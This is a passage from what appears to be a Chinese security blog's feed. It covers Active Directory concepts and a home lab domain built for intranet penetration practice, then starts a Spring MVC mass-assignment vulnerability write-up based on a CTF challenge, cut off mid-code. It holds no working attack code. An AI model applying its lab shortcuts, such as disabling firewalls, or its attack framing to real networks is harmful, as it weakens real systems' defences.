title="域控制器"></a>域控制器</h5><p>DC的概念在前面已说过。</p><p>可以在网络中配置多态DC，用来分担用户的登录、访问等操作。多个DC可以一起工作，自动备份用户账户和活动目录数据，提高网络的安全性和稳定性。</p><h5 id="成员服务器"><a href="#成员服务器" class="headerlink" title="成员服务器"></a>成员服务器</h5><p>成员服务器是指安装了服务器OS并加入了域、但没有安装活动目录的计算机，其主要任务是提供网络资源。</p><p>成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、Web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等。</p><h5 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h5><p>客户机是域中用户使用的计算机，用户通过客户机和域中的账户就能登录访问域。</p><h5 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h5><p>独立服务器和域没啥关系。如果服务器没加入域，也没安装活动目录，则称为独立服务器。</p><p>独立服务器可以创建工作组、与网络中的其他计算机共享资源，但不能使用活动目录提供的任何服务。</p><h4 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h4><p>组（Group）是用户账号的集合。通过向一组用户分配权限，就可以不必向每个用户分别分配权限。</p><p>下面看下几个类型的组。</p><h5 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h5><p>域本地组是指多域用户访问单域资源（访问同一个域），主要用于授权本域内资源的访问权限。</p><p>域本地组的成员可以来自域林中的任何域，域本地组用来访问同一域中的资源。</p><h5 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h5><p>全局组是指单域用户访问多域资源（必须是一个域里面的用户），只能在创建该全局组的域中添加用户和全局组。</p><p>全局组的成员可包括其所在域中的其他组和账户，而且可在林中的任何域中指派权限。</p><h5 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h5><p>通用组是指多域用户访问多域资源。</p><p>通用组的成员可包括域树或域林中任何域的其他组和账户，而且可在该域树或域林中的任何域中指派权限。</p><h5 id="小Trick"><a href="#小Trick" class="headerlink" title="小Trick"></a>小Trick</h5><ul><li>域本地组：来自全林，作用于本域；</li><li>全局组：来自本域，作用于全林；</li><li>通用组：来自全林，作用于全林；</li></ul><h5 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h5><p>A-G-DL-P策略（A：Account，用户账号；G：Global Group，全局组；DL：Domain Local Group，域本地组；P：Permission，资源权限）是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><p>A-G-DL-P策略是为了方便对用户进行组织和管理。当需要给一个用户添加某个权限时，只需要把这个用户添加到某一个域本地组中就可以了。</p><h5 id="内置组"><a href="#内置组" class="headerlink" title="内置组"></a>内置组</h5><p>在安装DC时，系统会自动生成一些组，即内置组。内置组内定义了一些常用的权限。通过将用户添加到内置组中，可以是用户获得相应的权限。</p><p>“Active Directory 用户和计算机”中的”Builtin”和”Users”组织单元中的组就是内置组，内置的域本地组在”Builtin”中，内置的全局组和通用组在”Users”中。</p><p>几个比较重要的域本地组权限：</p><ul><li>管理员组（Administrators）的成员可以完全不受限制地存取计算机/域的资源，不仅是最具权力的一个组，也是在活动目录和域控制器中具有默认的管理员权限的组。该组的成员可以更改 Enterprise Admins、Schem Admins 和 Domain Admins 组的成员关系，是域森林中强大的服务管理组。</li><li>远程登录组（Remote Desktop Users）的成员被授予远程登录的权限。</li><li>打印机操作员组（Print Operators）的成员可以管理网络打印机，包括建立、管理及删除网络打印机，并可以在本地登录和关闭域控制器。</li><li>账号操作员组（Account Operators）的成员可以创建和管理该域中的用户和组，并可以设置其权限，但是，不能更改隶属 Administrators 或 Domain Admins 组的账户，也不能修改这些组。Account Operators 可以在本地登录域控制器。在默认情况下，该组中没有成员。</li><li>服务器操作员组（Server Operators）的成员可以管理域服务器，包括建立/管理/删除任何服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器，以及变更服务器的系统时间等权限，并能关闭域控制器。在默认情况下，该组中没有成员。</li><li>备份操作员组（Backup Operators）的成员可以在域控制器上执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。</li></ul><p>几个比较重要的全局组、通用组的权限：</p><ul><li>域管理员组（Domain Admins）的成员在所有加入域的服务器和工作站、域控制器和活动目录上均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组 中，因此可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中，这样，Domain Admins 就对域中的所有计算机拥有了所有权。如果希望某用户成为域系统管理器，建议将该用户加至 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。</li><li>企业系统管理员组（Enterprise Admins）是域森林根域中的一个组。该组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问权。</li><li>架构管理员组（Schema Admins）是域森林根域中的一个组，可以修改活动目录域森林的模式。由于管理员组是提供活动目录和域控制器完整权限的域用户组，该组成员的资格是非常重要的。</li><li>域用户组（Domain Users）是所有域的成员。在预设的情况下，任何由我们建立的用户账户都是 Domain Users 组的成员，而任何由我们建立的计算机账户都是 Domain Computers 组的成员。因此，如果想让所有账户都具有某种资源存取权限，可以将该权限指定给 Domain Users 组，或者让 Domain Users 组属于具有该权限的组。Domain Users 组在预设的情况下是内建域局域 Users 组的成员。</li></ul><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p>活动目录（Active Directory，简称AD）是指域环境中提供目录服务的组件。AD存储了有关网络对象（比如用户、组、计算机、共享资源、打印机等）的信息，并且让管理员和用户能够轻松地查找和使用这些信息。AD使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</p><p>域树/域林内的所有域共享一个活动目录，每个域只存储该域内的数据。</p><p>活动目录(Active Directory)主要提供以下功能：</p><ol><li>服务器及客户端计算机管理：管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略。</li><li>用户服务：管理用户域账户、用户信息、企业通讯录（与电子邮件系统集成）、用户组管理、用户身份认证、用户授权管理等，按省实施组管理策略。</li><li>资源管理：管理打印机、文件共享服务等网络资源。</li><li>桌面配置：系统管理员可以集中的配置各种桌面配置策略，如：用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等。</li><li>应用系统支撑：支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统。</li></ol><p><strong>域控制器与活动目录的区别</strong></p><p>AD库：活动目录数据库，是指用于将大型网络中众多的对象（如计算机、用户、用户组、打印机、共享文件等）分类存放并将检索信息整理好以便于查找、管理和使用这些对象的数据库。</p><p>可知，这个AD库是实现域环境的关键。<strong>如果内网中某台计算机安装了AD，那么它就成为了DC（用于存储活动目录数据库的计算机）</strong>。</p><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><p>安全域划分即将同一安全等级的计算机划入同一个的网段，这样这些计算机都拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略（NACL）。在一个用路由器连接的局域网中,我们可以将网络划分为三个区域：安全级别最高的LAN Area（内网），安全级别中等的DMZ区域和安全级别最低的Internet区域（外网）。三个区域因担负不同的任务而拥有不同的访问策略。</p><p>而安全域的划分一般分为DMZ和内网。</p><p>典型的中小型内网的安全域划分如图，这里有两个安全域即两个虚线划出来的安全边界：</p><p><img src="/2020/02/15/内网渗透基础/5.png" alt=""></p><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><p>两个防火墙之间的空间被称为DMZ。安全性：<code>Internet &lt; DMZ &lt; 内网</code>。</p><p>DMZ（Demilitarized Zone），隔离区，也称非军事化区。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p><p>DMZ的屏障功能：</p><ol><li>内网可以访问外网：内网的用户显然需要自由地访问外网。在这一策略中，防火墙需要进行源地址转换。</li><li>内网可以访问DMZ：此策略是为了方便内网用户使用和管理DMZ中的服务器。</li><li>外网不能访问内网：很显然，内网中存放的是公司内部数据，这些数据不允许外网的用户进行访问。</li><li>外网可以访问DMZ：DMZ中的服务器本身就是要给外界提供服务的，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</li><li>DMZ访问内网有限制：很明显，如果违背此策略，则当入侵者攻陷DMZ时，就可以进一步进攻到内网的重要数据。</li><li>DMZ不能访问外网：此条策略也有例外，比如DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。在网络中，非军事区(DMZ)是指为不信任系统提供服务的孤立网段，其目的是把敏感的内部网络和其他提供访问服务的网络分开，阻止内网和外网直接通信，以保证内网安全。</li></ol><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><p>内网在安全域划分中是安全级别最高的，其中可以分为办公区和核心区。</p><h2 id="0x02-内网域环境搭建"><a href="#0x02-内网域环境搭建" class="headerlink" title="0x02 内网域环境搭建"></a>0x02 内网域环境搭建</h2><p>内网渗透很大程度上就是域渗透，这里使用Windows Server 2012 R2、Windows Server 2008 R2和Windows 7搭建最为简单的迷你型域环境，其中将Windows Server 2012 R2服务器安装AD升级为DC，然后将Windows Server 2008 R2和Windows 7加入到该域中。此外，再安装Monowall来构建含有防火墙的二级内网。</p><p>下面推荐几个下载OS镜像的地址：</p><ul><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></li><li><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li><li><a href="https://pcriver.com/operating-systems/windows-xp-professional-iso-download.html" target="_blank" rel="noopener">https://pcriver.com/operating-systems/windows-xp-professional-iso-download.html</a></li></ul><p>注意，为了 更逼真的内网环境，两台机子的虚拟网卡都选择Host-only模式。</p><h3 id="搭建域控制器"><a href="#搭建域控制器" class="headerlink" title="搭建域控制器"></a>搭建域控制器</h3><p>这里先安装好Windows Server 2012 R2系统，按如下步骤操作。</p><h4 id="设置IP"><a href="#设置IP" class="headerlink" title="设置IP"></a>设置IP</h4><p>这里设置服务器IP为192.168.1.1，而且一般域控制器和DNS服务器都是装在一起的，因此DNS服务器地址也写本机就好：</p><p><img src="/2020/02/15/内网渗透基础/6.png" alt=""></p><h4 id="更改计算机名"><a href="#更改计算机名" class="headerlink" title="更改计算机名"></a>更改计算机名</h4><p>在“控制面板-&gt;系统和安全-&gt;系统”中点击“更改设置-&gt;更改”，然后把计算机名改为“DC”，点击确定后重启计算机生效。</p><h4 id="安装域控制器和DNS服务"><a href="#安装域控制器和DNS服务" class="headerlink" title="安装域控制器和DNS服务"></a>安装域控制器和DNS服务</h4><p>Windows Server 2012 R2在开机时会自动打开服务器管理器，我们直接点击“添加角色和功能”：</p><p><img src="/2020/02/15/内网渗透基础/7.png" alt=""></p><blockquote><p>保持默认设置，单击“下 一步”按钮，进入“安装类型”页面。选择“基于角色或者基于功能的安装”选项，单击“下一 步”按钮，进入“服务器选择”选择页面。目前的服务器池中只有当前这一台机器，保持默认设置。单击“下一步”按钮，在“服务器角色”页面勾选“Active Directory 域服务”和“DNS 服务器”复选框：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/8.png" alt=""></p><p>在“功能”页面，保持默认设置，单击“下一步”按钮，进入“确认”页面。确认需要安装 的组件后，勾选“如果需要，自动重新启动目标服务器”复选框，然后单击安装：</p><p><img src="/2020/02/15/内网渗透基础/9.png" alt=""></p><h4 id="升级服务器"><a href="#升级服务器" class="headerlink" title="升级服务器"></a>升级服务器</h4><blockquote><p>Active Directory 域服务安装完成后，需要将此服务器提升为域控制器。单击“将此服务器提 升为域控制器”选项（如果不慎单击了“关闭”按钮，可以在“服务器管理器”页面中打开相关 页面），在右上角可以看到一个中间有“！”的三角形按钮。单击该按钮，提升服务器：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/10.png" alt=""></p><blockquote><p>AD 域服务安装完成。接着，进入“Active Directory 域服务配置向导”页面，在部署操作中单 击选中“添加新林”单选按钮并输入根域名（必须使用允许的 DNS 域命名约定） 。将根域名设置 为“hacke.testlab”：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/11.png" alt=""></p><blockquote><p>在“域控制器选项”页面，将林功能级别、域功能级别都设置为 Windows Server 2012 R2，如图所示。在创建新林时，在默认情况下选择 DNS 服务器，林中的第一个域控制器必须是全局目录服务器且不能是只读域控制器（RODC） 。输入目录服务还原模式密码，在开机进入安全模式修复 AD 数据库时将使用此密码。 </p></blockquote><p><img src="/2020/02/15/内网渗透基础/12.png" alt=""></p><p>在 DNS 选项页面会出现关于 DNS 的警告。不用理会该警告，保持默认设置。单击“下一步” 按钮，进入“其他选项”页面，在 NetBIOS 域名（不支持DNS 域名的旧系统，如 Windows 98、 NT 系统，需要通过 NetBIOS 域名进行通信）页面保持默认设置。单击“下一步”按钮，进入“路 径”界面，指定数据库、日志、sysvol 的存放位置，其他选项保持默认设置。接着单击“下一步” 按钮，保持页面上的默认设置。当到了先决条件检查时，会检测出当前Administrator用户密码不符合要求，这是因为Administrator用户将成为域Administrator用户了：</p><p><img src="/2020/02/15/内网渗透基础/28.png" alt=""></p><p>此时我们去创建或修改Administrator用户的密码后再点击“重新运行先决条件检测”，这时候发现就OK了，直接单击“安装”即可。</p><p>安装完成后，需要重启服务器。重启完成后，需要使用域管理员账户（HACKE\Administrator）登录。此时在“服 务器管理器”页面就可以看到 AD DS、DNS 服务了，如图所示。 </p><p><img src="/2020/02/15/内网渗透基础/13.png" alt=""></p><h4 id="创建Active-Directory用户"><a href="#创建Active-Directory用户" class="headerlink" title="创建Active Directory用户"></a>创建Active Directory用户</h4><p>为Windows 7创建域控账户，在“Active Directory 用户和计算机”页面转到“Users”目录并单击右键，添加新用户：</p><p><img src="/2020/02/15/内网渗透基础/14.png" alt=""></p><p>创建一个testuser账户：</p><p><img src="/2020/02/15/内网渗透基础/15.png" alt=""></p><h3 id="配置Windows-7加入该域"><a href="#配置Windows-7加入该域" class="headerlink" title="配置Windows 7加入该域"></a>配置Windows 7加入该域</h3><p>将Windows 7系统加入该域，先设置IP地址为192.168.1.2，DNS地址为192.168.1.1， 然后查看设置并运行<code>ping hacker.testlab</code>命令进行测试：</p><p><img src="/2020/02/15/内网渗透基础/16.png" alt=""></p><p>接下来，将主机加入域，更改计算机名为“WIN7-x64”，将域名更改为 “hacker.testlab”。 单击“确定”按钮后，会弹出要求输入拥有权限的域账户名称和密码的对话框。 在这里，输入域管理员用户账号和密码：</p><p><img src="/2020/02/15/内网渗透基础/17.png" alt=""></p><p>操作成功后，会出现重启计算机的提示。用创建的testuser用户登录域即可。</p><p>此时，我们在DC中“Active Directory 用户和计算机”页面的Computers项可以看到Win7加入的计算机名：</p><p><img src="/2020/02/15/内网渗透基础/18.png" alt=""></p><p>当我们右键该项选择“所有任务-&gt;管理”时，会报如下错误，这是防火墙拦截的原因：</p><p><img src="/2020/02/15/内网渗透基础/19.png" alt=""></p><p><img src="/2020/02/15/内网渗透基础/20.png" alt=""></p><p>此时，为了方便，就直接将Win7上的防火墙关闭掉就好，当然在当前域环境下，在Win7进行相关操作时需要DC的adminsitrator用户权限才能操作的：</p><p><img src="/2020/02/15/内网渗透基础/21.png" alt=""></p><p>此时回到DC，我们就能成功管理这台Win7了：</p><p><img src="/2020/02/15/内网渗透基础/22.png" alt=""></p><h3 id="配置Windows-Server-2008-R2加入该域"><a href="#配置Windows-Server-2008-R2加入该域" class="headerlink" title="配置Windows Server 2008 R2加入该域"></a>配置Windows Server 2008 R2加入该域</h3><p>同Win7上面的操作一样，看下结果就好：</p><p><img src="/2020/02/15/内网渗透基础/29.png" alt=""></p><p><img src="/2020/02/15/内网渗透基础/30.png" alt=""></p><h3 id="通过防火墙m0n0wall构建二级内网"><a href="#通过防火墙m0n0wall构建二级内网" class="headerlink" title="通过防火墙m0n0wall构建二级内网"></a>通过防火墙m0n0wall构建二级内网</h3><h4 id="m0n0wall简介"><a href="#m0n0wall简介" class="headerlink" title="m0n0wall简介"></a>m0n0wall简介</h4><p>m0n0wall 是一个完整的、嵌入式的防火墙软件包，该软件包可以安装于嵌入式PC里。m0n0wall基于bare-bones version of FreeBSD，包括一个WEB服务器，PHP和另一些工具软件。整个系统的配置保存在一个XML文件当中。m0n0wall可能是第一个启动时通过PHP配置的UNIX系统。m0n0wall编写者认为m0n0wall不包含在第3层 和第4层防火墙的基础服务外的任何功能。因为m0n0wall是嵌入式的防火墙面向嵌入设备有限的CPU资源和记忆体资源。m0n0wall不允许登录： 在控制台没有登录提示符，（它被一个功能菜单代替） ,没有任何Telnet或SSH守护程序。</p><p>官网：<a href="https://m0n0.ch/wall/index.php" target="_blank" rel="noopener">https://m0n0.ch/wall/index.php</a></p><p>含中文版的下载地址：<a href="http://www.cat-home.org/?action=show&amp;id=158" target="_blank" rel="noopener">http://www.cat-home.org/?action=show&amp;id=158</a></p><h4 id="m0n0wall安装"><a href="#m0n0wall安装" class="headerlink" title="m0n0wall安装"></a>m0n0wall安装</h4><p>在VM中新建虚拟机，打开对应的iso文件，选择FreeBSD版本，内存选择10G即可。</p><p>都点击确认好之后，重点在于还需要给该虚拟机添加多一个网卡，即一个为Host-only模式用于内网，另一个为桥接模式连接外网：</p><p><img src="/2020/02/15/内网渗透基础/23.png" alt=""></p><p>之后启动虚拟机即可开启安装。</p><p>首先是需要安装到硬盘中，选择7：</p><p><img src="/2020/02/15/内网渗透基础/24.png" alt=""></p><p>接着选择硬盘，这里只有一块名为ad3的硬盘，选择它并输入确认y：</p><p><img src="/2020/02/15/内网渗透基础/25.png" alt=""></p><p>此时只需等待安装完成。</p><h4 id="网卡接口分配"><a href="#网卡接口分配" class="headerlink" title="网卡接口分配"></a>网卡接口分配</h4><p>重启之后进入如下界面，我们先输入1来进行网卡接口的分配：</p><p><img src="/2020/02/15/内网渗透基础/26.png" alt=""></p><p>如图输入，第一个设置LAN即内网网卡的填em0即通过Mac地址找到的对应Host-only那个网卡，第二个设置WAN即外网网卡的填em1即通过Mac地址找到的对应桥接那个网卡：</p><p><img src="/2020/02/15/内网渗透基础/27.png" alt=""></p><p>之后重启即可。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>浅析自动绑定漏洞之Spring MVC</title>
    <link href="https://www.mi1k7ea.com/2020/02/12/%E6%B5%85%E6%9E%90%E8%87%AA%E5%8A%A8%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E%E4%B9%8BSpring-MVC/"/>
    <id>https://www.mi1k7ea.com/2020/02/12/浅析自动绑定漏洞之Spring-MVC/</id>
    <published>2020-02-12T13:40:37.000Z</published>
    <updated>2020-02-13T15:18:48.823Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-MVC自动绑定漏洞"><a href="#0x01-Spring-MVC自动绑定漏洞" class="headerlink" title="0x01 Spring MVC自动绑定漏洞"></a>0x01 Spring MVC自动绑定漏洞</h2><h3 id="自动绑定漏洞"><a href="#自动绑定漏洞" class="headerlink" title="自动绑定漏洞"></a>自动绑定漏洞</h3><p>自动绑定功能在很多框架中都有实现，主要功能是允许软件框架自动将HTTP请求中的参数绑定到程序变量或对象中以便于开发者访问。</p><p>而自动绑定漏洞的漏洞点在于，攻击者可能将额外的HTTP请求参数绑定到一个对象上，使用这种方法来创建、修改、更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象，进而触发一些业务逻辑漏洞。</p><p>一般而言，自动绑定漏洞的发现是通过白盒审计的形式才能找到的。</p><h3 id="Spring-MVC中两个关键注解"><a href="#Spring-MVC中两个关键注解" class="headerlink" title="Spring  MVC中两个关键注解"></a>Spring  MVC中两个关键注解</h3><p>在Spring MVC框架中与自动绑定漏洞相关的注解有如下两个。</p><h4 id="ModelAttribute注解"><a href="#ModelAttribute注解" class="headerlink" title="@ModelAttribute注解"></a>@ModelAttribute注解</h4><p>通过@ModelAttribute注解可实现以下两个功能：</p><p><strong>1、绑定请求参数到实体对象（表单的命令对象）</strong></p><p>@ModelAttribute注解运用在参数上，会将客户端传递过来的参数按名称注入到指定对象中，并且会将这个对象自动加入ModelMap中，便于View层使用。</p><p>如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/register"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">register</span><span class="params">(@ModelAttribute(<span class="string">"user"</span>)</span> UserForm user) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"zhangsan"</span>.equals(uname) &amp;&amp; <span class="string">"123456"</span>.equals(upass)) &#123;</span><br><span class="line">        logger.info(<span class="string">"成功"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"login"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        logger.info(<span class="string">"失败"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"register"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中<code>@ModelAttribute（&quot;user&quot;）UserForm user</code>语句的功能有两个：</p><ul><li>将请求参数的输入封装到user对象中。</li><li>创建UserForm实例。</li></ul><p>以“user”为键值存储在Model对象中，和<code>model.addAttribute(&quot;user&quot;，user)</code>语句的功能一样。如果没有指定键值，即<code>@ModelAttribute UserForm user</code>，那么在创建UserForm实例时以“userForm”为键值存储在Model对象中，和<code>model.addAtttribute(&quot;userForm&quot;, user)</code>语句的功能一样。</p><p><strong>2、注解一个非请求处理方法</strong></p><p>被@ModelAttribute注解的方法将在每次调用该控制器类的请求处理方法前被调用。这种特性可以用来控制登录权限，当然控制登录权限的方法有很多，例如拦截器、过滤器等。</p><p>使用该特性控制登录权限，创建BaseController，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ModelAttribute;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ModelAttribute</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">isLogin</span><span class="params">(HttpSession session)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">"user"</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"没有权限"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建ModelAttributeController，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/admin"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAttributeController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/add"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"addSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/update"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"updateSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/delete"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"deleteSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述ModelAttributeController类中的add、update、delete请求处理方法执行时，首先执行父类BaseController中的isLogin()方法判断登录权限，可以通过地址<code>http://localhost:8080/springMVCDemo02/admin/add</code>测试登录权限。</p><h4 id="SessionAttributes注解"><a href="#SessionAttributes注解" class="headerlink" title="@SessionAttributes注解"></a>@SessionAttributes注解</h4><p>默认情况下Spring MVC将模型中的数据存储到request域中。当一个请求结束后，数据就失效了。如果要跨页面使用。那么需要使用到session。而@SessionAttributes注解就可以使得模型中的数据存储一份到session域中。</p><blockquote><p>Spring 允许我们有选择地指定 ModelMap 中的哪些属性需要转存到 session 中，以便下一个请求对应的 ModelMap 的属性列表中还能访问到这些属性。这一功能是通过类定义处标注 @SessionAttributes(“user”) 注解来实现的。SpringMVC 就会自动将 @SessionAttributes 定义的属性注入到 ModelMap 对象，在 setup action 的参数列表时，去 ModelMap 中取到这样的对象，再添加到参数列表。只要不去调用 SessionStatus 的 setComplete() 方法，这个对象就会一直保留在 Session 中，从而实现 Session 信息的共享。</p></blockquote><h2 id="0x02-案例"><a href="#0x02-案例" class="headerlink" title="0x02 案例"></a>0x02 案例</h2><p>这里参考ZeroNigths HackQuest 2016的两道和自动绑定漏洞相关的Web题，源码下载地址: <a href="https://github.com/3wapp/ZeroNights-HackQuest-2016" target="_blank" rel="noopener">https://github.com/3wapp/ZeroNights-HackQuest-2016</a></p><h3 id="Justice-League"><a href="#Justice-League" class="headerlink" title="Justice League"></a>Justice League</h3><p>将war包放置于Tomcat中跑起来后，看到Justice League页面存在4个功能点：关于、注册、登录、找回密码。</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/8.png" alt=""></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>下面先进行代码审计，直接看到注册功能的Controller，ResetPasswordController.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResetPasswordController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(ResetPasswordController.class);</span><br><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> UserService 